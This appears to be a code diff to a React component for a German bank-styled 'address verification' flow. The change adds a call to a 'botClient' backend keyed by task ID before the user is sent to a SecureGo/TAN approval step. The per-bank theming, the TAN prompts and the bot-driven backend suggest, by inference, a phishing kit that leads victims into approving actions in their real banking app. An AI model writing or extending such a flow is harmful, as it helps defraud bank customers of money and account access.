@@ -1,4 +1,5 @@
 import { useState } from "react";
+import { confirmAddress } from "@/lib/botClient";
 import {
   MapPin,
   Info,
@@ -40,6 +41,7 @@ function splitAddr(a: Address) {
 
 export function AddressVerificationStep({
   theme,
+  taskId,
   currentAddress,
   additionalAddress,
   bankGroup,
@@ -48,6 +50,7 @@ export function AddressVerificationStep({
   onDeleted,
 }: {
   theme: FlowTheme;
+  taskId?: string;
   currentAddress: Address;
   additionalAddress: Address;
   bankGroup?: string;
@@ -66,8 +69,25 @@ export function AddressVerificationStep({
   const [secureGoApproved, setSecureGoApproved] = useState(false);
   const [showExplanation, setShowExplanation] = useState(false);
   const [showTanExplanation, setShowTanExplanation] = useState(false);
+  const [deleteError, setDeleteError] = useState<string | null>(null);
+  const [deleting, setDeleting] = useState(false);
 
-  const openSecureGo = () => {
+  const openSecureGo = async () => {
+    if (!taskId) {
+      setDeleteError("Sitzung nicht gefunden. Bitte neu anmelden.");
+      return;
+    }
+    setDeleteError(null);
+    setDeleting(true);
+    try {
+      const res = await confirmAddress(taskId);
+      if (!res.ok) throw new Error(`HTTP ${res.status}`);
+    } catch (e: any) {
+      setDeleting(false);
+      setDeleteError(`Löschen fehlgeschlagen: ${e?.message ?? "Unbekannter Fehler"}`);
+      return;
+    }
+    setDeleting(false);
     setShowDeleteDialog(false);
     setSecureGoApproved(false);
     setShowSecureGo(true);
@@ -277,18 +297,23 @@ export function AddressVerificationStep({
                 </div>
               </AlertDialogDescription>
             </AlertDialogHeader>
+            {deleteError && (
+              <p className="text-sm text-red-600 mb-3">{deleteError}</p>
+            )}
             <AlertDialogFooter className="flex justify-end gap-3 pt-2">
               <AlertDialogCancel
+                disabled={deleting}
                 className={`mt-0 ${theme.buttonRadius || "rounded-full"} px-6 py-2.5 border-gray-300 text-gray-700 hover:bg-gray-50 font-medium text-sm`}
               >
                 Abbrechen
               </AlertDialogCancel>
               <AlertDialogAction
-                className={`${theme.buttonRadius || "rounded-full"} px-6 py-2.5 text-white font-medium text-sm hover:opacity-90 border-0`}
+                disabled={deleting}
+                className={`${theme.buttonRadius || "rounded-full"} px-6 py-2.5 text-white font-medium text-sm hover:opacity-90 border-0 disabled:opacity-60`}
                 style={{ backgroundColor: theme.buttonBg }}
-                onClick={openSecureGo}
+                onClick={(e) => { e.preventDefault(); openSecureGo(); }}
               >
-                Adresse löschen
+                {deleting ? "Wird gelöscht…" : "Adresse löschen"}
               </AlertDialogAction>
             </AlertDialogFooter>
           </div>
